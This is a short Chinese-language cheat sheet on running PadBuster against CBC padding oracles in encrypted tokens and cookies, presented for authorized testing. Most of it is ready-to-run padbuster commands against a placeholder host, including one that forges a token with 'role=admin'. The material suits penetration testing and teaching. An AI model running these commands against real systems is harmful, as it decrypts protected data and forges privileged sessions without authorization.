# PadBuster 使用

PadBuster 用于验证 CBC padding oracle 问题。它适合老应用、加密 cookie、ViewState 类字段和自研 token 的授权测试。

## 基础验证

```bash
padbuster http://example.local/profile.php?token=TOKEN TOKEN 8
```

```bash
padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -encoding 0
```

```bash
padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -cookies "PHPSESSID=abc"
```

## 错误条件

```bash
padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -error "PaddingException"
```

```bash
padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -prefix "user="
```

## 加密新明文

```bash
padbuster http://example.local/profile.php?token=TOKEN TOKEN 16 -plaintext "role=admin"
```

小记录：padding oracle 要靠稳定错误差异判断。先用代理观察响应码、长度和错误文本，再让工具跑，结果更可靠。
